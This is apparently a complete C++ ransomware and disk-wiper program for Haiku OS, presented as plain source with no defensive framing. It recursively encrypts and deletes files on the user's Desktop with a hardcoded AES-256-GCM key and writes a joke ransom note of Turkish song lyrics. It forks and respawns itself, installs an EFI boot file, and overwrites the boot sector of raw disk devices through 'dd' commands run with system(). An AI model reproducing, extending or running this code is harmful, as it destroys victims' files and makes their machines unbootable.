#include <cstdlib> // Include this for system()
#include <unistd.h> // Include this for fork()
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <iostream>
#include <fstream>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <FindDirectory.h>
#include <Path.h>
#include <vector>

const unsigned char key[32] = "utkubabaprohecklediutkubaba";  // 32-byte key for AES-256
const unsigned char iv[12] = "31693169316";  // Fixed 12-byte IV for AES-GCM 
const size_t TAG_LENGTH = 16; // Tag length for GCM
const int FILE_LIMIT = 8192; // Maximum number of files to encrypt in one task

int total_files_encrypted = 0; // Counter for encrypted files

// Function to get the user's Desktop directory
void get_desktop_directory(char *dirpath, size_t size) {
    BPath path;
    if (find_directory(B_USER_DIRECTORY, &path) == B_OK) {
        snprintf(dirpath, size, "%s/Desktop", path.Path()); // Get Desktop path
    } else {
        perror("Could not find user directory");
    }
}

// Function to write ransom note
void create_ransom_note(const char *dirpath) {
    std::string ransom_note_path = std::string(dirpath) + "/UTKUBABAPROHECKLEDI.txt";
    std::ofstream ransom_note(ransom_note_path, std::ios::out);
    
    if (!ransom_note.is_open()) {
        std::cerr << "Error creating ransom note." << std::endl;
        return;
    }

    ransom_note << "0:15\n♪ UtkuBabaHeykır Hack'ledi Dünya'yı ♪\n"
                << "0:19\n♪ Klavyeler gitti, kasalar patladı ♪\n"
                << "0:23\n♪ YouTube kanallarına DDOS atıldı ♪\n"
                << "0:27\n♪ Babapro heykır herkesi Hack'ledi ♪\n"
                << "0:31\n♪ Chat'e yazı yazıp bizi Hack'ledi ♪\n"
                << "0:36\n♪ Kendi bilgisayarına virüs indirdi ♪\n"
                << "0:40\n♪ Baba heykır, pro heykır, babapro heykır, Utkudoruk ♪\n"
                << "1:02\n♪ Utkudoruk, babapro heykır ♪\n"
                << "1:06\n♪ Utkudoruk, baba, baba hiçkır ♪\n"
                << "1:10\n♪ Utkudoruk, babapro heykır ♪\n"
                << "1:14\n♪ Utkudrk, baba baba hiçkır ♪\n"
                << "1:18\n♪ Chat'e yazı yazıp bizi Hack'ledi ♪\n"
                << "1:23\n♪ Kendi bilgisayarına virüs indirdi ♪\n"
                << "1:27\n♪ Baba heykır, pro heykır, babapro heykır, Utkudoruk ♪\n"
                << "1:34\n♪ Baba heykır, pro heykır, babapro heykır, Utkudoruk ♪\n"
                << "1:42\n♪ Baba heykır, pro heykır, babapro heykır, Utkudoruk ♪\n"
                << "\nVideo Reference: https://www.youtube.com/watch?v=y4SYSX-Xgfk\n"; // Add video reference

    ransom_note.close();
    std::cout << "Ransom note created: " << ransom_note_path << std::endl;
}

// Function to encrypt a file using AES-256-GCM
void encrypt_file(const char *filepath, const char *dirpath, const unsigned char *key, const char *app_name) {
    // Check if the file is a ransom note or already encrypted
    if (strstr(filepath, ".utkudorukbayraktarheckledi") || strstr(filepath, "UTKUBABAPROHECKLEDI.txt")) {
        std::cout << "Skipping ransom note or already encrypted file: " << filepath << std::endl;
        return;
    }

    std::ifstream infile(filepath, std::ios::binary);
    if (!infile.is_open()) {
        std::cerr << "Error opening file: " << filepath << std::endl;
        return;
    }

    // Read the file into a buffer
    infile.seekg(0, std::ios::end);
    size_t filesize = infile.tellg();
    infile.seekg(0, std::ios::beg);

    std::vector<unsigned char> file_buffer(filesize);
    infile.read((char*)file_buffer.data(), filesize);
    infile.close();

    // Initialize OpenSSL context for AES-GCM
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        std::cerr << "Error creating EVP_CIPHER_CTX" << std::endl;
        return;
    }

    // Initialize encryption
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
        std::cerr << "Error initializing encryption" << std::endl;
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    // Set IV length and initialize key and IV
    EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv);

    std::vector<unsigned char> encrypted_buffer(filesize + TAG_LENGTH);
    int len = 0;

    // Encrypt the data
    if (EVP_EncryptUpdate(ctx, encrypted_buffer.data(), &len, file_buffer.data(), filesize) != 1) {
        std::cerr << "Error during encryption" << std::endl;
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    int ciphertext_len = len;

    // Finalize the encryption
    if (EVP_EncryptFinal_ex(ctx, encrypted_buffer.data() + len, &len) != 1) {
        std::cerr << "Error finalizing encryption" << std::endl;
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    ciphertext_len += len;

    // Get the authentication tag
    unsigned char tag[TAG_LENGTH];
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_LENGTH, tag) != 1) {
        std::cerr << "Error getting tag" << std::endl;
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    EVP_CIPHER_CTX_free(ctx);

    // Append the tag to the encrypted buffer
    encrypted_buffer.insert(encrypted_buffer.end(), tag, tag + TAG_LENGTH);

    // Write encrypted content back to a new file with a .utkudorukbayraktarheckledi extension
    std::string new_filepath = std::string(filepath) + ".utkudorukbayraktarheckledi";
    std::ofstream outfile(new_filepath, std::ios::binary);
    outfile.write((char*)encrypted_buffer.data(), ciphertext_len + TAG_LENGTH);
    outfile.close();

    // Create ransom note in the same directory
    create_ransom_note(dirpath);

    // Optionally remove the original file
    remove(filepath);
    std::cout << "Encrypted file: " << new_filepath << std::endl;

    total_files_encrypted++; // Increment the count of encrypted files

    // Check if we've reached the limit
    if (total_files_encrypted >= FILE_LIMIT) {
        // Fork a new process to continue encryption
        pid_t pid = fork();
        if (pid < 0) {
            std::cerr << "Error forking process." << std::endl;
        } else if (pid == 0) {
            // Child process
            std::cout << "Reached file limit. Spawning new task..." << std::endl;
            execlp(app_name, app_name, NULL); // Use app name dynamically
            perror("execlp failed");
            exit(EXIT_FAILURE);
        }
    }
}

// Recursively encrypts all files in a directory
void encrypt_directory(const char *dirpath, const unsigned char *key, const char *app_name) {
    DIR *dir = opendir(dirpath);
    if (!dir) {
        perror("Could not open directory");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char filepath[1024];
        snprintf(filepath, sizeof(filepath), "%s/%s", dirpath, entry->d_name);

        struct stat path_stat;
        stat(filepath, &path_stat);

        if (S_ISDIR(path_stat.st_mode)) {
            // Fork a new process for each directory
            pid_t pid = fork();
            if (pid < 0) {
                std::cerr << "Error forking process." << std::endl;
            } else if (pid == 0) {
                // Child process
                encrypt_directory(filepath, key, app_name);
                exit(0); // Exit child process after encryption
            }
        } else if (S_ISREG(path_stat.st_mode)) {
            encrypt_file(filepath, dirpath, key, app_name);
        }
    }

    closedir(dir);
}

// Function to search for raw disk files in /dev/disk and write the MBR payload if found
void search_raw_files() {
    const char *dir_path = "/dev/disk";
    DIR *dir = opendir(dir_path);
    struct dirent *entry;

    if (dir == nullptr) {
        std::cerr << "Error opening directory: " << dir_path << std::endl;
        return;
    }

    std::cout << "Searching for raw disk files in " << dir_path << ":\n";

    bool found_raw = false; // Flag to check if any raw disk file is found

    while ((entry = readdir(dir)) != nullptr) {
        if (strstr(entry->d_name, "raw") != nullptr) {
            std::cout << "Found: " << entry->d_name << std::endl;
            found_raw = true;

            // Construct the full path to the raw device
            std::string raw_device_path = std::string(dir_path) + "/" + entry->d_name;

            // Execute the dd command to write the MBR payload
            std::string command = "dd if=utkudrk.bin of=" + raw_device_path + " bs=512 count=1";
            system(command.c_str());
            std::cout << "MBR payload written to " << raw_device_path << std::endl;
            break; // Exit the loop after writing to the first found raw device
        }
    }

    if (!found_raw) {
        std::cout << "No raw disk files found." << std::endl;
    }

    closedir(dir);
}

int main(int argc, char *argv[]) {
    // Open files
    system("ulimit -S -n 8192");

    // Guarantee access for utkuhecklerbabapro
    system("chmod 777 utkuhecklerbabapro");

    system("open https://www.youtube.com/watch?v=Sq5wjvqxN6M &");

    system("open utkudrk.mp3 &");

    // Create directories and copy bootx64.efi
    system("mkdir -p /EFIBOOT/EFI/BOOT");
    system("cp bootx64.efi /EFIBOOT/EFI/BOOT/BOOTX64.EFI"); // Replace with actual path

    // Search for raw disk files and write MBR payload
    search_raw_files();

    // Use dd to write utkudrk.bin to the MBR
    system("dd if=utkudrk.bin of=/dev/disk/virtual/ram/raw bs=512 count=1");

    char dirpath[1024];

    // Get the user's Desktop directory
    get_desktop_directory(dirpath, sizeof(dirpath));

    std::cout << "Encrypting Desktop directory: " << dirpath << std::endl;
    encrypt_directory(dirpath, key, argv[0]); // Pass the app name to the function

    return 0;
}
